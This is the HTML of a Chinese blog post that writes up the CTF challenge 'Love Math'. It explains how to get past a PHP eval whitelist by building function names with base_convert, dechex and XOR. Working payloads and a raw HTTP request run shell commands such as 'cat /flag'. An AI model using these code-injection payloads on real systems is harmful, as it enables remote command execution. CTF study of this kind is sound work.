@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="基础分析1234$blacklist &#x3D; [&amp;#x27; &amp;#x27;, &amp;#x27;\t&amp;#x27;, &amp;#x27;\r&amp;#x27;, &amp;#x27;\n&amp;#x27;,&amp;#x27;\&amp;#x27;&amp;#x27;, &amp;#x27;&quot;&amp;#x27;, &amp;#x27;&#96;&amp;#x27;, &amp;#x27;\[&amp;#x27;, &amp;#x27;\]&amp;#x27;];&#x2F;&#x2F;过滤了这些特殊字符$whitelist &#x3D; [&amp;#x">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF-WEB-[CISCN 2019 初赛]Love Math-白名单绕过-eval">
+<meta property="og:url" content="http://example.com/2022/04/19/BUUCTF-WEB-CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math-%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87-eval/index.html">
+<meta property="og:site_name" content="Imp1ture">
+<meta property="og:description" content="基础分析1234$blacklist &#x3D; [&amp;#x27; &amp;#x27;, &amp;#x27;\t&amp;#x27;, &amp;#x27;\r&amp;#x27;, &amp;#x27;\n&amp;#x27;,&amp;#x27;\&amp;#x27;&amp;#x27;, &amp;#x27;&quot;&amp;#x27;, &amp;#x27;&#96;&amp;#x27;, &amp;#x27;\[&amp;#x27;, &amp;#x27;\]&amp;#x27;];&#x2F;&#x2F;过滤了这些特殊字符$whitelist &#x3D; [&amp;#x">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-04-19T09:07:21.000Z">
+<meta property="article:modified_time" content="2022-04-19T12:36:23.047Z">
+<meta property="article:author" content="Imp1ture">
+<meta property="article:tag" content="WEB">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>BUUCTF-WEB-[CISCN 2019 初赛]Love Math-白名单绕过-eval</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/tags/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2022/04/19/BUUCTF-WEB-ASIS-2019-Unicorn-shop-Unicode%E9%97%AE%E9%A2%98/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/04/19/BUUCTF-WEB-CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math-%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87-eval/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/04/19/BUUCTF-WEB-CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math-%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87-eval/&text=BUUCTF-WEB-[CISCN 2019 初赛]Love Math-白名单绕过-eval"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/04/19/BUUCTF-WEB-CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math-%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87-eval/&title=BUUCTF-WEB-[CISCN 2019 初赛]Love Math-白名单绕过-eval"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/04/19/BUUCTF-WEB-CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math-%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87-eval/&is_video=false&description=BUUCTF-WEB-[CISCN 2019 初赛]Love Math-白名单绕过-eval"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BUUCTF-WEB-[CISCN 2019 初赛]Love Math-白名单绕过-eval&body=Check out this article: http://example.com/2022/04/19/BUUCTF-WEB-CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math-%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87-eval/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/04/19/BUUCTF-WEB-CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math-%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87-eval/&title=BUUCTF-WEB-[CISCN 2019 初赛]Love Math-白名单绕过-eval"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/04/19/BUUCTF-WEB-CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math-%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87-eval/&title=BUUCTF-WEB-[CISCN 2019 初赛]Love Math-白名单绕过-eval"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/04/19/BUUCTF-WEB-CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math-%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87-eval/&title=BUUCTF-WEB-[CISCN 2019 初赛]Love Math-白名单绕过-eval"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/04/19/BUUCTF-WEB-CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math-%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87-eval/&title=BUUCTF-WEB-[CISCN 2019 初赛]Love Math-白名单绕过-eval"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/04/19/BUUCTF-WEB-CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math-%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87-eval/&name=BUUCTF-WEB-[CISCN 2019 初赛]Love Math-白名单绕过-eval&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/04/19/BUUCTF-WEB-CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math-%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87-eval/&t=BUUCTF-WEB-[CISCN 2019 初赛]Love Math-白名单绕过-eval"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">基础分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">工具使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload1"><span class="toc-number">3.</span> <span class="toc-text">payload1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload2"><span class="toc-number">4.</span> <span class="toc-text">payload2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload3"><span class="toc-number">5.</span> <span class="toc-text">payload3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload4"><span class="toc-number">6.</span> <span class="toc-text">payload4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">7.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">8.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        BUUCTF-WEB-[CISCN 2019 初赛]Love Math-白名单绕过-eval
+    </h1>
+
+
+
+	
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Imp1ture</span>
+      </span>
+	  <!--Leancloud 阅读量-->
+	  
+	<span id="/2022/04/19/BUUCTF-WEB-CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math-%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87-eval/" class="leancloud-visitors" data-flag-title="BUUCTF-WEB-[CISCN 2019 初赛]Love Math-白名单绕过-eval">
+		<em class="post-meta-item-text">阅读量</em>
+		<i class="leancloud-visitors-count">loading</i>
+	</span>
+
+
+
+	  
+	  <!--Leancloud 阅读量-->
+	  
+      
+    <div class="postdate">
+      
+        <time datetime="2022-04-19T09:07:21.000Z" itemprop="datePublished">2022-04-19</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/WEB/" rel="tag">WEB</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="基础分析"><a href="#基础分析" class="headerlink" title="基础分析"></a>基础分析</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];<span class="comment">//过滤了这些特殊字符</span></span><br><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];<span class="comment">//白名单</span></span><br><span class="line"><span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>); <span class="comment">//匹配使用的函数，基本原理是连续匹配字母和数字 </span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);<span class="comment">//直接拼接了_GET[&#x27;c&#x27;]，想着怎么利用呢</span></span><br></pre></td></tr></table></figure>
+<h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><p><a target="_blank" rel="noopener" href="https://www.jisuan.mobi/pb61bNub61uzmUJX.html">任意进制转换</a></p>
+<h2 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h2><p>我们想，如果没有后面的白名单，我们怎么利用呢？</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">phpinfo</span>();<span class="variable">$a</span>=system;<span class="variable">$a</span>(<span class="variable">$_GET</span>[c]);</span><br><span class="line">?c=<span class="variable">$a</span>=_GET;<span class="variable">$$a</span>[b](<span class="variable">$$a</span>[c]);&amp;b=system&amp;c=ls;<span class="comment">//这里本地测试失败，必须将使用$x=$$a来过度，不明白为什么</span></span><br></pre></td></tr></table></figure>
+<p>但是呢，特殊字符之间，我们只能用白名单里的数学函数，所以利用如下构造</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">构造_GET</span><br><span class="line"><span class="variable">$pi</span>=<span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">dechex</span>(<span class="number">1598506324</span>));(<span class="variable">$$pi</span>&#123;abs&#125;)(<span class="variable">$$pi</span>&#123;acos&#125;)&amp;abs=system&amp;acos=ls</span><br><span class="line"><span class="comment">//base_convert(37907361743,10,36)是hex2bin，可以将hex转化为字符串</span></span><br><span class="line"><span class="comment">//dechex(1598506324) 是将_GET的十进制转化为hex，方便hex2bin使用</span></span><br><span class="line"><span class="comment">//base_convert直接转换成_GET，因为 &#x27;_&#x27;，在进制里面没有，只能用hex2bin配合转化</span></span><br><span class="line"><span class="variable">$pi</span>=<span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">dechex</span>(<span class="number">1598506324</span>));(<span class="variable">$$pi</span>&#123;abs&#125;)(<span class="variable">$$pi</span>&#123;acos&#125;)&amp;abs=system&amp;acos=cat /flag</span><br><span class="line"><span class="comment">//拿到flag</span></span><br></pre></td></tr></table></figure>
+<p>怎么说呢，这里就是要对php这些函数套用比较熟练，然后多积累骚姿势。</p>
+<h2 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h2><p>可以构造getallheaders()传参，此是小写的，可以直接用base_convert转换。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">构造:</span><br><span class="line"><span class="variable">$pi</span>=base_convert,<span class="variable">$pi</span>(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="variable">$pi</span>(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>)()&#123;<span class="number">1</span>&#125;)</span><br><span class="line">分析：</span><br><span class="line"><span class="title function_ invoke__">base_convert</span>(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>) =&gt;<span class="string">&quot;exec&quot;</span></span><br><span class="line"><span class="variable">$pi</span>(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>) =&gt;<span class="string">&quot;getallheaders&quot;</span><span class="comment">//这里没有使用36进制原因是精度不够，我本地测试发现当字符串过长的时候，无法逆操作。这里可以用网站的返回判断</span></span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="title function_ invoke__">getallheaders</span>()&#123;<span class="number">1</span>&#125;)</span><br></pre></td></tr></table></figure>
+<p>在报文里添加 <code>1: cat /flag|base64</code>，以base64格式输出</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /?c=$pi=base_convert,$pi(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>)($pi(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>)()%7B1%7D) HTTP/<span class="number">1.1</span></span><br><span class="line">Host: 49ba5ffb-d8e0-475f-a05d-568f87b6078e.node4.buuoj.cn:<span class="number">81</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">72.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">72.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*/*;q=<span class="number">0.8</span></span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.8</span>,zh-TW;q=<span class="number">0.7</span>,zh-HK;q=<span class="number">0.5</span>,en-US;q=<span class="number">0.3</span>,en;q=<span class="number">0.2</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Referer: http://49ba5ffb-d8e0-475f-a05d-568f87b6078e.node4.buuoj.cn:<span class="number">81</span>/?c=$pi=base_convert,$pi(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>)($pi(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>)()%257B1%257D)</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"><span class="number">1</span>:cat /flag|base64 </span><br></pre></td></tr></table></figure>
+<h2 id="payload3"><a href="#payload3" class="headerlink" title="payload3"></a>payload3</h2><p>直接cat f*</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">hexdec</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="string">&#x27;cat f*&#x27;</span>));        <span class="comment">//得到109270211257898</span></span><br><span class="line"><span class="title function_ invoke__">base_convert</span>(<span class="string">&#x27;exec&#x27;</span>,<span class="number">36</span>,<span class="number">10</span>);        <span class="comment">//得到696468</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//exec(&#x27;hex2bin(dechex(109270211257898))&#x27;) =&gt; exec(&#x27;cat f*&#x27;)</span></span><br><span class="line">(<span class="variable">$pi</span>=base_convert)(<span class="number">22950</span>,<span class="number">23</span>,<span class="number">34</span>)(<span class="variable">$pi</span>(<span class="number">76478043844</span>,<span class="number">9</span>,<span class="number">34</span>)(<span class="title function_ invoke__">dechex</span>(<span class="number">109270211257898</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">dechex</span>(<span class="number">16</span>)^asinh^pi;        <span class="comment">//输出*</span></span><br><span class="line"><span class="title function_ invoke__">base_convert</span>(<span class="string">&#x27;cat&#x27;</span>,<span class="number">36</span>,<span class="number">10</span>);        <span class="comment">//得到15941</span></span><br><span class="line"><span class="title function_ invoke__">base_convert</span>(<span class="string">&#x27;system&#x27;</span>,<span class="number">36</span>,<span class="number">10</span>);        <span class="comment">//得到1751504350</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//system(&#x27;cat&#x27;.dechex(16)^asinh^pi) =&gt; system(&#x27;cat *&#x27;)</span></span><br><span class="line"><span class="title function_ invoke__">base_convert</span>(<span class="number">1751504350</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">base_convert</span>(<span class="number">15941</span>,<span class="number">10</span>,<span class="number">36</span>).(<span class="title function_ invoke__">dechex</span>(<span class="number">16</span>)^asinh^pi))</span><br></pre></td></tr></table></figure>
+
+<h2 id="payload4"><a href="#payload4" class="headerlink" title="payload4"></a>payload4</h2><p>利用异或拼接<br>异或脚本，这个可以重复使用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$payload</span>=[<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>,  <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$k</span>=<span class="number">1</span>;<span class="variable">$k</span>&lt;=<span class="title function_ invoke__">sizeof</span>(<span class="variable">$payload</span>);<span class="variable">$k</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">9</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;<span class="variable">$j</span>&lt;=<span class="number">9</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="variable">$exp</span>=<span class="variable">$payload</span>[<span class="variable">$k</span>] ^<span class="variable">$i</span>.<span class="variable">$j</span>;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="variable">$payload</span>[<span class="variable">$k</span>].<span class="string">&quot;^<span class="subst">$i</span><span class="subst">$j</span>&quot;</span>.<span class="string">&quot;==&gt;<span class="subst">$exp</span>&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span><span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="variable">$pi</span>=(is_nan^(<span class="number">6</span>).(<span class="number">4</span>)).(tan^(<span class="number">1</span>).(<span class="number">5</span>));<span class="variable">$pi</span>=<span class="variable">$$pi</span>;<span class="variable">$pi</span>&#123;<span class="number">0</span>&#125;(<span class="variable">$pi</span>&#123;<span class="number">1</span>&#125;)&amp;<span class="number">0</span>=system&amp;<span class="number">1</span>=cat flag.php</span><br><span class="line"> </span><br><span class="line"><span class="comment">//$pi=_GET;$pi=$_GET;$_GET[0]($_GET[1])&amp;0=system&amp;1=cat flag.php     ==&gt; system(cat flag.php)</span></span><br><span class="line"><span class="comment">//这里也是用我的那个方式，用了pi作为过渡，之前那个为什么不用呢？需要php大佬来解答了</span></span><br></pre></td></tr></table></figure>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>php环境 下过滤的方式有很多，还需要慢慢积累，靠自己想真的有些难度。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://johnfrod.top/ctf/%E5%88%A9%E7%94%A8%E6%95%B0%E5%AD%A6%E5%87%BD%E6%95%B0%E6%9E%84%E9%80%A0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">[CISCN 2019 初赛]Love Math</a><br><a target="_blank" rel="noopener" href="https://www.jisuan.mobi/pb61bNub61uzmUJX.html">任意进制转换</a></p>
+
+  </div>
+</article>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/tags/">分类</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
